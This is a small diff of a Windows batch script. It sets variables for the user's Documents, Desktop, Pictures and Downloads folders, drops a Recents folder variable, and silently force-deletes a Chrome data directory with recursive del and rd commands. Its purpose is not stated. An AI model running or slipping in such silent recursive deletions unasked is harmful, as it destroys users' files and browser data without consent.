@@ -8,7 +8,6 @@ set Documents=C:\Users\%USERNAME%\Documents\
 set Desktop=C:\Users\%USERNAME%\Desktop\
 set Pictures=C:\Users\%USERNAME%\Pictures\
 set Downloads= C:\Users\%USERNAME%\Downloads\
-set Recents= %AppData%\Microsoft\Windows\Recent\
 
 del /q /s /f "%ChromeDir%"
 rd /s /q "%ChromeDir%"
